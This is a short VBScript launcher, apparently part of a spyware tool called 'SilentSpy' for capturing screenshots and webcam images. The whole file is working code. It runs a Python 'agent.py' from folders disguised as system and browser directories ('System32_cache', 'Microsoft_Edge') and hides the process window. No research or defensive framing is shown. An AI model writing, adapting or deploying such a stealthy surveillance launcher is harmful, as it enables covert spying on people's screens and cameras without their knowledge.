' SilentSpy - Fixed for screenshots/webcam
Dim fso, currentFolder, pythonPath, scriptPath, shell

Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)

pythonPath = currentFolder & "\System32_cache\pythonw.exe"
scriptPath = currentFolder & "\Microsoft_Edge\agent.py"

Set shell = CreateObject("WScript.Shell")

' CRITICAL: Set working directory to agent's folder
shell.CurrentDirectory = currentFolder & "\Microsoft_Edge"

' Run the agent
shell.Run pythonPath & " " & scriptPath, 0, False

Set shell = Nothing
Set fso = Nothing